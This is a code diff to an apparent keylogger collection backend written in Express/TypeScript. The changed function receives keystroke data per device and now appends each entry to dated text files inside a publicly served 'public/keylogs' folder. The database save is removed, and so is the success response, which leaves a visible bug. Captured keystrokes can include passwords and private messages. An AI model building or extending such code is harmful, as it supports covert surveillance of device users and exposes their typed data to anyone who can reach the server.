@@ -1,3 +1,5 @@
+import fs from "fs";
+import path from "path";
 import { Request, Response } from "express";
 import { validationResult } from "express-validator";
 import KeyLogs from "../models/keylogs.model";
@@ -42,9 +44,21 @@ export const addNewKeyLogs = async (data: any) => {
 			keyevent: event,
 		});
 
-		await newKeyLog.save();
+		// Create a username folder if it doesn't exist
+		const logsDir = path.join(__dirname, "../../public/keylogs", deviceId);
+		if (!fs.existsSync(logsDir)) {
+			fs.mkdirSync(logsDir, { recursive: true });
+		}
 
-		return { status: 200, message: "Key logs added successfully" };
+		// Get today's date in YYYY-MM-DD format
+		const today = new Date().toISOString().split("T")[0];
+		const filePath = path.join(logsDir, `${today}.txt`);
+
+		// Prepare the log entry
+		const logEntry = `${new Date().toISOString()} - ${keyLogsType}: ${keylogs}, Event: ${event}\n`;
+
+		// Append the log entry to the file
+		fs.appendFileSync(filePath, logEntry);
 	} catch (error) {
 		console.error("Error adding key logs:", error);
 		return { status: 500, error: "Failed to add key logs" };
